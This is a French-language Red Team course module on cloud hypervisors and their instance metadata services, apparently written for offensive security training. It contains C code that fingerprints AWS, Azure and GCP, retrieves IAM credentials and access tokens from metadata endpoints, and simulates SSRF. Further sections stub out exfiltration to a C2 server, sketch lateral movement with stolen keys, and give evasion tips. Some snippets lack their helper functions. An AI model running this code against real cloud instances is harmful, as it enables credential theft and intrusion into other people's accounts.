# Module A05 : Hyperviseurs Cloud (AWS Nitro, Azure, GCP)

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre l'architecture des hyperviseurs cloud (AWS Nitro, Azure Hyper-V, GCP KVM)
- [ ] Identifier les différences avec les hyperviseurs traditionnels
- [ ] Détecter l'environnement cloud depuis un guest
- [ ] Exploiter les APIs de métadonnées cloud
- [ ] Comprendre les implications sécurité pour le Red Team

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases de la virtualisation (Module A01)
- Concepts d'hyperviseurs Type 1 et Type 2
- Programmation C et requêtes HTTP
- Notions de base sur AWS/Azure/GCP

## Introduction

Les hyperviseurs cloud (AWS Nitro, Azure Hyper-V, Google KVM) sont des technologies de virtualisation optimisées pour le cloud public. Contrairement aux hyperviseurs traditionnels, ils sont conçus pour la performance, la sécurité et l'isolation multi-tenant.

### Pourquoi ce sujet est important ?

Imaginez un immeuble de bureaux (datacenter cloud) où chaque entreprise loue un étage (VM). L'hyperviseur cloud est le gestionnaire de l'immeuble qui :
- Garantit que personne ne peut entrer chez le voisin
- Fournit les services (électricité, eau = CPU, RAM)
- Optimise les ressources communes

Pour un Red Teamer :
- **Reconnaissance** : Détecter qu'on est dans AWS/Azure/GCP
- **Persistence** : Utiliser les metadata services pour exfiltrer des credentials
- **Lateral movement** : Exploiter les APIs cloud pour pivoter
- **VM escape** : Comprendre les limites de l'isolation

## 1. AWS Nitro System

### 1.1 Architecture Nitro

AWS Nitro est un hyperviseur basé sur KVM, mais déporte la plupart des fonctions vers du hardware dédié.

```
┌─────────────────────────────────────────────────┐
│         Instance EC2 (Guest VM)                  │
│  ┌──────────────────────────────────────┐       │
│  │    Applications                       │       │
│  ├──────────────────────────────────────┤       │
│  │    OS (Linux/Windows)                │       │
│  └──────────────────────────────────────┘       │
├─────────────────────────────────────────────────┤
│     Nitro Hypervisor (KVM minimal)              │
├─────────────────────────────────────────────────┤
│  Nitro Cards (Hardware dédié)                   │
│  ┌───────────┬────────────┬──────────────┐      │
│  │ Nitro I/O │ Nitro Sec  │ Nitro EBS    │      │
│  │ (Réseau)  │ (Isolation)│ (Stockage)   │      │
│  └───────────┴────────────┴──────────────┘      │
├─────────────────────────────────────────────────┤
│         Hardware (Serveurs AWS)                  │
└─────────────────────────────────────────────────┘
```

**Composants Nitro** :
- **Nitro Hypervisor** : KVM léger, fonctions minimales
- **Nitro Cards** : Cartes hardware dédiées (networking, EBS, security)
- **Nitro Security Chip** : TPM-like pour attestation

**Avantages** :
- Performance quasi bare-metal (déport vers hardware)
- Isolation renforcée (hardware-based)
- Moins de surface d'attaque hyperviseur

### 1.2 Instance Metadata Service (IMDS)

IMDS est un service HTTP accessible depuis les VMs AWS qui expose des informations critiques.

```
Instance EC2
     │
     │ HTTP GET http://169.254.169.254/
     ↓
┌─────────────────────────────┐
│  Instance Metadata Service  │
│  (169.254.169.254)         │
├─────────────────────────────┤
│  - Instance ID              │
│  - IAM Credentials          │
│  - User Data                │
│  - Security Groups          │
│  - SSH Keys                 │
└─────────────────────────────┘
```

**Versions IMDS** :
- **IMDSv1** : HTTP simple (vulnérable SSRF)
- **IMDSv2** : Requiert un token (protection SSRF)

### 1.3 Détecter AWS Nitro en C

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Callback pour récupérer la réponse HTTP
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    strncat((char *)userp, (char *)contents, realsize);
    return realsize;
}

int detect_aws_nitro(void) {
    CURL *curl;
    CURLcode res;
    char response[4096] = {0};

    printf("[*] Test 1: CPUID Hypervisor Vendor\n");

    uint32_t eax, ebx, ecx, edx;
    char vendor[13] = {0};

    __cpuid(0x40000000, eax, ebx, ecx, edx);
    memcpy(vendor, &ebx, 4);
    memcpy(vendor + 4, &ecx, 4);
    memcpy(vendor + 8, &edx, 4);

    printf("[+] Hypervisor vendor: %s\n", vendor);

    if (strstr(vendor, "KVMKVMKVM")) {
        printf("[+] KVM détecté (potentiellement AWS Nitro)\n");
    }

    printf("\n[*] Test 2: Instance Metadata Service (IMDSv1)\n");

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://169.254.169.254/latest/meta-data/instance-id");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        res = curl_easy_perform(curl);

        if (res == CURLE_OK && strlen(response) > 0) {
            printf("[+] IMDS accessible! Instance ID: %s\n", response);
            printf("[+] Confirmation: AWS EC2 détecté\n");
            curl_easy_cleanup(curl);
            return 1;
        } else {
            printf("[-] IMDS non accessible\n");
        }

        curl_easy_cleanup(curl);
    }

    return 0;
}

int exfiltrate_aws_credentials(void) {
    CURL *curl;
    CURLcode res;
    char response[8192] = {0};
    char url[512];

    printf("\n[*] Tentative d'exfiltration de credentials IAM\n");

    // Étape 1: Lister les rôles IAM
    curl = curl_easy_init();
    if (!curl) return 0;

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        printf("[+] Rôle IAM détecté: %s\n", response);

        // Étape 2: Récupérer les credentials du rôle
        snprintf(url, sizeof(url),
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/%s",
            response);

        memset(response, 0, sizeof(response));
        curl_easy_setopt(curl, CURLOPT_URL, url);

        res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            printf("[+] Credentials IAM récupérés:\n%s\n", response);
            // En pratique: exfiltrer via C2
        }
    } else {
        printf("[-] Pas de rôle IAM attaché\n");
    }

    curl_easy_cleanup(curl);
    return 0;
}

int main(void) {
    printf("=== Détection AWS Nitro ===\n\n");

    if (detect_aws_nitro()) {
        exfiltrate_aws_credentials();
    } else {
        printf("\n[-] Pas d'environnement AWS détecté\n");
    }

    return 0;
}
```

### 1.4 Exploitation IMDSv1 via SSRF

```c
#include <stdio.h>
#include <stdlib.h>

// Simulation d'une SSRF dans une application web
void simulate_ssrf_attack(const char *target_url) {
    printf("[*] SSRF Attack Simulation\n");
    printf("[*] Target URL (user-controlled): %s\n", target_url);

    // Application vulnérable qui fetch une URL user-supplied
    char command[1024];
    snprintf(command, sizeof(command),
        "curl -s '%s'", target_url);

    printf("\n[+] Exécution de: %s\n", command);
    system(command);
}

int main(void) {
    // Attaquant exploite SSRF pour accéder à IMDS
    const char *malicious_url =
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/";

    simulate_ssrf_attack(malicious_url);

    return 0;
}
```

## 2. Microsoft Azure Hyper-V

### 2.1 Architecture Hyper-V

Azure utilise Hyper-V, un hyperviseur Type 1 de Microsoft.

```
┌─────────────────────────────────────────────────┐
│         VM Guest (Azure VM)                      │
│  ┌──────────────────────────────────────┐       │
│  │    Applications                       │       │
│  ├──────────────────────────────────────┤       │
│  │    OS (Linux/Windows)                │       │
│  └──────────────────────────────────────┘       │
├─────────────────────────────────────────────────┤
│     Hyper-V Hypervisor                          │
│  ┌────────────────────────────────────┐         │
│  │  Root Partition (Host OS)          │         │
│  │  - VM Management                   │         │
│  │  - Device Drivers                  │         │
│  └────────────────────────────────────┘         │
├─────────────────────────────────────────────────┤
│         Hardware                                 │
└─────────────────────────────────────────────────┘
```

**Composants Hyper-V** :
- **Hypervisor** : Mode VMX root
- **Root Partition** : VM privilégiée (gère les autres VMs)
- **Child Partitions** : VMs guests

### 2.2 Azure Instance Metadata Service

Azure IMDS : http://169.254.169.254/metadata/instance

```c
#include <stdio.h>
#include <curl/curl.h>
#include <string.h>

int detect_azure(void) {
    CURL *curl;
    CURLcode res;
    char response[4096] = {0};
    struct curl_slist *headers = NULL;

    printf("[*] Détection Azure via IMDS\n");

    curl = curl_easy_init();
    if (!curl) return 0;

    // Azure IMDS requiert le header "Metadata: true"
    headers = curl_slist_append(headers, "Metadata: true");

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        printf("[+] Azure détecté!\n");
        printf("[+] Métadonnées:\n%s\n", response);

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
        return 1;
    }

    printf("[-] Pas d'Azure détecté\n");
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    return 0;
}

int get_azure_managed_identity_token(void) {
    CURL *curl;
    CURLcode res;
    char response[8192] = {0};
    struct curl_slist *headers = NULL;

    printf("\n[*] Récupération Managed Identity Token\n");

    curl = curl_easy_init();
    if (!curl) return 0;

    headers = curl_slist_append(headers, "Metadata: true");

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://169.254.169.254/metadata/identity/oauth2/token?"
        "api-version=2018-02-01&resource=https://management.azure.com/");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        printf("[+] Access Token récupéré:\n%s\n", response);
        // Token utilisable pour Azure API
    } else {
        printf("[-] Pas de Managed Identity\n");
    }

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    return 0;
}
```

### 2.3 Détecter Hyper-V avec CPUID

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <cpuid.h>

int detect_hyperv_cpuid(void) {
    uint32_t eax, ebx, ecx, edx;
    char vendor[13] = {0};

    printf("[*] Détection Hyper-V via CPUID\n");

    // CPUID 0x40000000: Hypervisor vendor
    __cpuid(0x40000000, eax, ebx, ecx, edx);

    memcpy(vendor, &ebx, 4);
    memcpy(vendor + 4, &ecx, 4);
    memcpy(vendor + 8, &edx, 4);

    printf("[+] Hypervisor Vendor: %s\n", vendor);

    if (strcmp(vendor, "Microsoft Hv") == 0) {
        printf("[+] Hyper-V confirmé!\n");

        // CPUID 0x40000001: Hyper-V Interface Signature
        __cpuid(0x40000001, eax, ebx, ecx, edx);

        char signature[5] = {0};
        memcpy(signature, &eax, 4);

        printf("[+] Interface Signature: %s\n", signature); // "Hv#1"

        return 1;
    }

    return 0;
}
```

## 3. Google Cloud Platform (GCP) KVM

### 3.1 Architecture GCP

GCP utilise KVM avec des optimisations custom (similaire à AWS Nitro).

```
┌─────────────────────────────────────────────────┐
│         VM Instance (GCE)                        │
│  ┌──────────────────────────────────────┐       │
│  │    Applications                       │       │
│  ├──────────────────────────────────────┤       │
│  │    OS (Linux/Windows)                │       │
│  └──────────────────────────────────────┘       │
├─────────────────────────────────────────────────┤
│     KVM Hypervisor (Custom)                     │
├─────────────────────────────────────────────────┤
│  Virtual NIC (VirtIO offload)                   │
├─────────────────────────────────────────────────┤
│         Hardware (Google Servers)                │
└─────────────────────────────────────────────────┘
```

### 3.2 GCP Metadata Service

GCP IMDS : http://metadata.google.internal/

```c
#include <stdio.h>
#include <curl/curl.h>

int detect_gcp(void) {
    CURL *curl;
    CURLcode res;
    char response[4096] = {0};
    struct curl_slist *headers = NULL;

    printf("[*] Détection GCP via Metadata Service\n");

    curl = curl_easy_init();
    if (!curl) return 0;

    // GCP requiert le header "Metadata-Flavor: Google"
    headers = curl_slist_append(headers, "Metadata-Flavor: Google");

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://metadata.google.internal/computeMetadata/v1/instance/name");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        printf("[+] GCP détecté!\n");
        printf("[+] Instance Name: %s\n", response);

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
        return 1;
    }

    printf("[-] Pas de GCP détecté\n");
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    return 0;
}

int get_gcp_service_account_token(void) {
    CURL *curl;
    CURLcode res;
    char response[8192] = {0};
    struct curl_slist *headers = NULL;

    printf("\n[*] Récupération Service Account Token\n");

    curl = curl_easy_init();
    if (!curl) return 0;

    headers = curl_slist_append(headers, "Metadata-Flavor: Google");

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://metadata.google.internal/computeMetadata/v1/instance/"
        "service-accounts/default/token");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        printf("[+] Access Token récupéré:\n%s\n", response);
    } else {
        printf("[-] Pas de Service Account\n");
    }

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    return 0;
}
```

## 4. Comparaison des hyperviseurs cloud

```
┌──────────────────┬────────────┬─────────────┬──────────────┐
│ Caractéristique  │ AWS Nitro  │ Azure Hyper │ GCP KVM      │
├──────────────────┼────────────┼─────────────┼──────────────┤
│ Base             │ KVM        │ Hyper-V     │ KVM          │
│ Type             │ Type 1     │ Type 1      │ Type 1       │
│ Hardware offload │ Oui (Nitro)│ Partiel     │ VirtIO       │
│ IMDS URL         │ 169.254... │ 169.254...  │ metadata...  │
│ IMDS Protection  │ IMDSv2     │ Header Req  │ Header Req   │
│ CPUID Vendor     │ KVMKVMKVM  │ Microsoft Hv│ KVMKVMKVM    │
│ Nested Virt      │ Oui (i3)   │ Oui (Dv3)   │ Oui (N2D)    │
└──────────────────┴────────────┴─────────────┴──────────────┘
```

## 5. Détection universelle multi-cloud

```c
#include <stdio.h>
#include <curl/curl.h>
#include <string.h>

typedef enum {
    CLOUD_NONE,
    CLOUD_AWS,
    CLOUD_AZURE,
    CLOUD_GCP
} cloud_provider_t;

cloud_provider_t detect_cloud_universal(void) {
    CURL *curl;
    CURLcode res;
    char response[1024] = {0};
    struct curl_slist *headers = NULL;

    // Test 1: AWS
    printf("[*] Test AWS...\n");
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL,
            "http://169.254.169.254/latest/meta-data/");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        res = curl_easy_perform(curl);
        if (res == CURLE_OK && strlen(response) > 0) {
            curl_easy_cleanup(curl);
            printf("[+] AWS détecté!\n");
            return CLOUD_AWS;
        }
        curl_easy_cleanup(curl);
    }

    // Test 2: Azure
    printf("[*] Test Azure...\n");
    memset(response, 0, sizeof(response));
    curl = curl_easy_init();
    if (curl) {
        headers = curl_slist_append(headers, "Metadata: true");
        curl_easy_setopt(curl, CURLOPT_URL,
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        res = curl_easy_perform(curl);
        if (res == CURLE_OK && strlen(response) > 0) {
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
            printf("[+] Azure détecté!\n");
            return CLOUD_AZURE;
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    // Test 3: GCP
    printf("[*] Test GCP...\n");
    memset(response, 0, sizeof(response));
    curl = curl_easy_init();
    if (curl) {
        headers = curl_slist_append(headers, "Metadata-Flavor: Google");
        curl_easy_setopt(curl, CURLOPT_URL,
            "http://metadata.google.internal/computeMetadata/v1/");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        res = curl_easy_perform(curl);
        if (res == CURLE_OK && strlen(response) > 0) {
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
            printf("[+] GCP détecté!\n");
            return CLOUD_GCP;
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    printf("[-] Aucun cloud détecté\n");
    return CLOUD_NONE;
}

const char* cloud_name(cloud_provider_t cloud) {
    switch(cloud) {
        case CLOUD_AWS: return "AWS";
        case CLOUD_AZURE: return "Azure";
        case CLOUD_GCP: return "GCP";
        default: return "None";
    }
}
```

## 6. Applications offensives

### 6.1 Exfiltration de credentials cloud

```c
#include <stdio.h>
#include <stdlib.h>

void exfiltrate_to_c2(const char *data) {
    // Simulation d'exfiltration
    printf("[*] Exfiltration vers C2...\n");
    // En pratique: HTTPS POST vers C2 server
    printf("[+] Data exfiltrée: %s\n", data);
}

void exploit_cloud_metadata(cloud_provider_t cloud) {
    char command[1024];
    char output[8192] = {0};
    FILE *fp;

    switch(cloud) {
        case CLOUD_AWS:
            printf("\n[*] Exploitation AWS IMDS\n");

            // Récupérer credentials IAM
            fp = popen("curl -s http://169.254.169.254/latest/meta-data/"
                      "iam/security-credentials/ 2>/dev/null", "r");
            if (fp) {
                fgets(output, sizeof(output), fp);
                pclose(fp);

                if (strlen(output) > 0) {
                    snprintf(command, sizeof(command),
                        "curl -s http://169.254.169.254/latest/meta-data/"
                        "iam/security-credentials/%s", output);

                    fp = popen(command, "r");
                    if (fp) {
                        memset(output, 0, sizeof(output));
                        while (fgets(output + strlen(output),
                               sizeof(output) - strlen(output), fp));
                        pclose(fp);

                        exfiltrate_to_c2(output);
                    }
                }
            }
            break;

        case CLOUD_AZURE:
            printf("\n[*] Exploitation Azure Managed Identity\n");

            fp = popen("curl -s -H 'Metadata: true' "
                      "'http://169.254.169.254/metadata/identity/oauth2/token?"
                      "api-version=2018-02-01&resource=https://management.azure.com/'",
                      "r");
            if (fp) {
                while (fgets(output + strlen(output),
                       sizeof(output) - strlen(output), fp));
                pclose(fp);

                exfiltrate_to_c2(output);
            }
            break;

        case CLOUD_GCP:
            printf("\n[*] Exploitation GCP Service Account\n");

            fp = popen("curl -s -H 'Metadata-Flavor: Google' "
                      "'http://metadata.google.internal/computeMetadata/v1/"
                      "instance/service-accounts/default/token'", "r");
            if (fp) {
                while (fgets(output + strlen(output),
                       sizeof(output) - strlen(output), fp));
                pclose(fp);

                exfiltrate_to_c2(output);
            }
            break;

        default:
            break;
    }
}
```

### 6.2 Pivot vers d'autres VMs (Lateral Movement)

```c
// Utiliser les credentials cloud pour énumérer et pivoter
void lateral_movement_aws(const char *access_key, const char *secret_key) {
    char command[1024];

    printf("[*] Énumération des instances EC2...\n");

    // Configurer AWS CLI avec credentials volés
    setenv("AWS_ACCESS_KEY_ID", access_key, 1);
    setenv("AWS_SECRET_ACCESS_KEY", secret_key, 1);

    // Lister les instances
    system("aws ec2 describe-instances --region us-east-1");

    // Lister les buckets S3
    system("aws s3 ls");

    // Créer une backdoor dans une autre instance
    printf("[*] Tentative de pivot vers autre instance...\n");
}
```

## 7. Protection contre les attaques IMDS

### 7.1 IMDSv2 (AWS)

```c
// IMDSv2 requiert un token
int access_imdsv2(void) {
    CURL *curl;
    CURLcode res;
    char token[256] = {0};
    char response[4096] = {0};
    struct curl_slist *headers = NULL;

    // Étape 1: Obtenir un token
    curl = curl_easy_init();
    if (!curl) return 0;

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://169.254.169.254/latest/api/token");
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");

    headers = curl_slist_append(headers, "X-aws-ec2-metadata-token-ttl-seconds: 21600");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, token);

    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK || strlen(token) == 0) {
        printf("[-] Impossible d'obtenir token IMDSv2\n");
        return 0;
    }

    printf("[+] Token IMDSv2 obtenu: %s\n", token);

    // Étape 2: Utiliser le token pour accéder IMDS
    curl = curl_easy_init();
    if (!curl) return 0;

    char header[512];
    snprintf(header, sizeof(header), "X-aws-ec2-metadata-token: %s", token);
    headers = curl_slist_append(NULL, header);

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://169.254.169.254/latest/meta-data/instance-id");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        printf("[+] Instance ID (IMDSv2): %s\n", response);
    }

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    return 1;
}
```

## 8. Considérations OPSEC

### 8.1 Détection des requêtes IMDS

Les providers cloud peuvent logger les accès IMDS :
- Logs CloudTrail (AWS)
- Azure Monitor
- GCP Cloud Logging

**Techniques d'évasion** :
- Minimiser les requêtes IMDS
- Utiliser des requêtes légitimes (user-data, instance-id)
- Exfiltrer via canaux chiffrés

### 8.2 Limitations hyperviseur cloud

Contrairement aux hyperviseurs locaux, difficile de :
- Installer un blue pill (pas d'accès hardware)
- Exploiter des vulns hyperviseur (patché régulièrement)
- Échapper de la VM (isolation renforcée)

## Résumé

- AWS Nitro utilise KVM + hardware offload (Nitro Cards)
- Azure utilise Hyper-V avec Root/Child partitions
- GCP utilise KVM avec optimisations VirtIO
- IMDS expose des métadonnées critiques (credentials, tokens)
- IMDSv1 vulnérable SSRF, IMDSv2/headers requis pour protection
- Détecter le cloud via CPUID + IMDS
- Exploitation Red Team: exfiltration credentials, lateral movement
- OPSEC: logs IMDS, isolation renforcée

## Checklist

- [ ] Comprendre les différences AWS Nitro / Azure Hyper-V / GCP KVM
- [ ] Savoir détecter le cloud provider depuis une VM
- [ ] Connaître les URLs IMDS de chaque provider
- [ ] Exploiter IMDS pour récupérer credentials
- [ ] Comprendre IMDSv2 et ses protections
- [ ] Identifier les use-cases Red Team pour IMDS

## Exercices

Voir `exercice.md` pour les défis pratiques.

## Ressources complémentaires

- AWS Nitro System: https://aws.amazon.com/ec2/nitro/
- Azure Hyper-V Architecture: https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/
- GCP VM Architecture: https://cloud.google.com/compute/docs/instances
- IMDSv2 Deep Dive: https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/

---

**Navigation**
- [Retour au sommaire HYPERVISOR](../)
- [Module suivant : UEFI Basics](../../PHASE_A02_FIRMWARE/A06_uefi_basics/)
